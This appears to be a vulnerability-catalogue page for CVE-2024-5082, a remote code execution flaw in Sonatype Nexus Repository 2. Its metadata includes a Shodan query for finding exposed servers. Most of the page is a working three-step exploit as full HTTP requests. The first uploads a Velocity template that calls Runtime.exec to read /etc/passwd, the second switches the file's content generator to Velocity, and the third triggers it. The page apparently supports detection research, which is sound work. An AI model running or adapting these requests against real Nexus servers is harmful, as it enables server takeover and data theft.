---
layout: "post"
cve_id: "CVE-2024-5082"
title: "Nexus Repository 2 - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-5082.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-5082.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "high"
reference:
  - "https://github.blog/security/vulnerability-research/attacks-on-maven-proxy-repositories/"
  - "https://support.sonatype.com/hc/en-us/articles/30694125380755"
classification:
  epss-score: 0.08914
  epss-percentile: 0.92255
metadata:
  verified: True
  max-request: 3
  shodan-query: "html:\"Nexus Repository\""
tags:
  - "cve"
  - "cve2024"
  - "intrusive"
  - "nexus"
  - "sonartype"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
A Remote Code Execution vulnerability has been discovered in Sonatype Nexus Repository 2.This issue affects Nexus Repository 2 OSS/Pro versions up to and including 2.15.1.


## üåê HTTP Request
```nohighlight
PUT /nexus/service/local/repositories/releases/content/com/sbt/ignite/ignite-bom/maven-metadata.xml HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Content-Length: 493
Authorization: Basic TWxHSXl3Ok15b0kxVElq
Connection: close
Content-type: text/xml
Accept-Encoding: gzip

#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("cat /etc/passwd"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
$output
```

```nohighlight
PUT /nexus/service/local/repositories/releases/content//.nexus/attributes/com/sbt/ignite/ignite-bom/maven-metadata.xml HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Connection: close
Content-Length: 31
Authorization: Basic TWxHSXl3Ok15b0kxVElq
Content-type: application/json
Accept-Encoding: gzip

{"contentGenerator":"velocity"}
```

```nohighlight
GET /nexus/service/local/repositories/releases/content/com/sbt/ignite/ignite-bom/maven-metadata.xml HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15
Connection: close
Authorization: Basic TWxHSXl3Ok15b0kxVElq
Accept-Encoding: gzip
```


